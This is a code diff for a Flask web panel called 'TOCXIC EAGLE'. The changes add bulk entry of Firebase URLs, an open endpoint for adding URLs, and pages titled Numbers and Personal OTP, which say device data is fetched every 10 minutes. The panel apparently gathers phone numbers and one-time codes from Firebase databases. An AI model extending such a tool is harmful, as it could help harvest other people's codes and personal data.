+@app.route("/api/otp/add", methods=["POST"])
+def api_otp_add():
+    init_mongo()
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
+    try:
+        data = request.get_json() or {}
+        url = (data.get("url") or "").strip().rstrip("/")
+        if url and not url.startswith("http"): url = "https://" + url
+        if not url or "firebase" not in url:
+            return jsonify({"success": False, "error": "Invalid URL"}), 400
+        if fb_collection.find_one({"url": url}):
+            return jsonify({"success": True, "hash": fb_hash(url), "already": True})
+        name = url.replace("https://","").split(".")[0][:30]
+        fb_collection.insert_one({"url": url, "name": name,
+            "added_at": int(time.time()), "source": "personal_otp"})
+        if not IS_SERVERLESS:
+            threading.Thread(target=refresh_cache, daemon=True).start()
+        return jsonify({"success": True, "hash": fb_hash(url)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+# ═══════════════════════════════════════════════════════════════
+# FIREBASES / SECURITY / PERSONAL OTP PAGES
+# ═══════════════════════════════════════════════════════════════
 FIREBASES_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>Firebases</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
@@ -2267,6 +2397,7 @@ FIREBASES_HTML = """<!DOCTYPE html>
 .add-row input:focus{border-color:var(--blue2);box-shadow:0 0 0 4px rgba(59,130,246,.12)}
 .add-row button{padding:14px 22px;border:none;border-radius:12px;font-weight:800;font-size:12px;
   font-family:inherit;min-height:50px;cursor:pointer;background:var(--grad);color:#fff}
+.add-row button.green{background:linear-gradient(135deg,#12b76a,#32d583)}
 .fb-list{display:grid;gap:10px}
 .fb-card{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:16px;
   display:flex;align-items:center;gap:14px;flex-wrap:wrap}
@@ -2284,12 +2415,12 @@ FIREBASES_HTML = """<!DOCTYPE html>
 
 <div class="topbar">
 <div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
-<div class="nav-links" style="padding:0;background:none;border:none">
+</div>
+<div class="nav-links">
 <a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
 <a href="/firebases" class="nav-link active">🔥 Firebases</a>
 <a href="/admin/security" class="nav-link">🔒 Security</a>
 <a href="/logout" class="nav-link">Logout</a>
-</div>
 </div>
 
 <div class="container">
@@ -2299,6 +2430,7 @@ FIREBASES_HTML = """<!DOCTYPE html>
 <input id="fb-url" placeholder="https://xxx.firebaseio.com"
   onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
 <button onclick="addFirebase()">Add</button>
+<button class="green" onclick="bulkAdd()">Bulk Add</button>
 </div>
 <div id="fb-msg" class="msg"></div>
 </div>
@@ -2327,6 +2459,19 @@ async function addFirebase(){
     if(d.success){ showMsg('✅ Added','ok'); document.getElementById('fb-url').value=''; loadFbs(); }
     else showMsg('❌ ' + (d.error||'Error'),'err');
   } catch(e){ showMsg('❌ Network error','err'); }
+}
+
+async function bulkAdd(){
+  const txt = prompt('Paste URLs (one per line):');
+  if(!txt) return;
+  const urls = txt.split('\\n').map(x => x.trim()).filter(Boolean);
+  if(!urls.length) return showMsg('No URLs','err');
+  showMsg('⏳ Adding ' + urls.length + '...','ok');
+  const r = await fetch('/api/firebases/bulk', { method:'POST',
+    headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls}) });
+  const d = await r.json();
+  if(d.success){ showMsg('✅ Added: ' + d.added + ' · Skip: ' + d.skipped,'ok'); loadFbs(); }
+  else showMsg('❌ ' + (d.error||'Error'),'err');
 }
 
 async function loadFbs(){
@@ -2358,9 +2503,7 @@ async function removeFb(id){
   if(d.success){ toast('✅ Deleted'); loadFbs(); }
   else toast('❌ ' + (d.error||'Error'));
 }
-
 function escHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
 loadFbs();
 </script>
 </body></html>"""
@@ -2370,9 +2513,6 @@ loadFbs();
 def firebases_page():
     return Response(FIREBASES_HTML, mimetype="text/html")
 
-# ============================================================
-# SECURITY PAGE
-# ============================================================
 SECURITY_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>Security</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
@@ -2400,12 +2540,12 @@ SECURITY_HTML = """<!DOCTYPE html>
 
 <div class="topbar">
 <div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
-<div class="nav-links" style="padding:0;background:none;border:none">
+</div>
+<div class="nav-links">
 <a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
 <a href="/firebases" class="nav-link">🔥 Firebases</a>
 <a href="/admin/security" class="nav-link active">🔒 Security</a>
 <a href="/logout" class="nav-link">Logout</a>
-</div>
 </div>
 
 <div class="container">
@@ -2451,21 +2591,6 @@ async function changePwd(){
 def admin_security():
     return Response(SECURITY_HTML, mimetype="text/html")
 
-@app.route("/api/security/change", methods=["POST"])
-@admin_required
-def api_security_change():
-    init_mongo()
-    data = request.get_json() or {}
-    role = data.get("role", "").strip()
-    pwd = data.get("password", "").strip()
-    if role != "admin": return jsonify({"success": False, "error": "Only admin"}), 400
-    if not pwd or len(pwd) < 4: return jsonify({"success": False, "error": "Too short"}), 400
-    ok = set_pwd(role, pwd)
-    return jsonify({"success": True}) if ok else (jsonify({"success": False, "error": "Save failed"}), 500)
-
-# ============================================================
-# PERSONAL OTP (public user adds own firebase)
-# ============================================================
 PERSONAL_OTP_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>Personal OTP</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
@@ -2488,11 +2613,11 @@ PERSONAL_OTP_HTML = """<!DOCTYPE html>
 
 <div class="topbar">
 <div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
-<div class="nav-links" style="padding:0;background:none;border:none">
+</div>
+<div class="nav-links">
 <a href="/user" class="nav-link">📱 Numbers</a>
 <a href="/otp" class="nav-link green active">🔐 Personal OTP</a>
 <a href="/" class="nav-link">🏠 Home</a>
-</div>
 </div>
 
 <div class="container">
@@ -2513,7 +2638,7 @@ PERSONAL_OTP_HTML = """<!DOCTYPE html>
 2. Admin dashboard me register hoga<br>
 3. 10 min me device data fetch hoga<br>
 4. /user panel me numbers dikhengi<br>
-5. Admin broadcasts /mail tab me aayenge
+5. Admin broadcasts Mail tab me aayenge
 </div>
 </div>
 </div>
@@ -2524,7 +2649,7 @@ function toast(t){ const e = document.getElementById('toast'); e.textContent = t
 e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
 function showMsg(t, type){ const e = document.getElementById('msg');
 e.className = 'msg ' + type; e.textContent = t;
-if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 3000); }
+if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 4000); }
 async function addFirebase(){
   const url = document.getElementById('fb-url').value.trim();
   if(!url) return showMsg('❌ URL required','err');
@@ -2534,7 +2659,7 @@ async function addFirebase(){
       headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
     const d = await r.json();
     if(d.success){
-      showMsg('✅ Added! Admin dashboard me dekh sakte ho','ok');
+      showMsg('✅ Added! Admin dashboard me 10 min me dikhega','ok');
       document.getElementById('fb-url').value = '';
       toast('✅ Firebase added');
     } else showMsg('❌ ' + (d.error||'Error'),'err');
@@ -2547,36 +2672,16 @@ async function addFirebase(){
 def personal_otp():
     return Response(PERSONAL_OTP_HTML, mimetype="text/html")
 
-@app.route("/api/otp/add", methods=["POST"])
-def api_otp_add():
-    init_mongo()
-    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
-    try:
-        data = request.get_json() or {}
-        url = (data.get("url") or "").strip().rstrip("/")
-        if url and not url.startswith("http"): url = "https://" + url
-        if not url or "firebase" not in url:
-            return jsonify({"success": False, "error": "Invalid URL"}), 400
-        if fb_collection.find_one({"url": url}):
-            return jsonify({"success": True, "hash": fb_hash(url), "already": True})
-        name = url.replace("https://","").split(".")[0][:30]
-        fb_collection.insert_one({"url": url, "name": name,
-            "added_at": int(time.time()), "source": "personal_otp"})
-        if not IS_SERVERLESS:
-            threading.Thread(target=refresh_cache, daemon=True).start()
-        return jsonify({"success": True, "hash": fb_hash(url)})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
-# ============================================================
-# START BG
-# ============================================================
+# ═══════════════════════════════════════════════════════════════
+# START
+# ═══════════════════════════════════════════════════════════════
 if not IS_SERVERLESS:
     threading.Thread(target=bg_refresher, daemon=True).start()
-    print(f"BG refresher started — interval: {BG_REFRESH_INTERVAL}s (10 min)")
+    print(f"[✓] BG refresher started — {BG_REFRESH_INTERVAL}s interval (10 min)")
 else:
-    print("Serverless mode: BG disabled")
+    print("[i] Serverless mode: BG disabled")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
+    print(f"[✓] Starting TOCXIC EAGLE on 0.0.0.0:{port}")
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
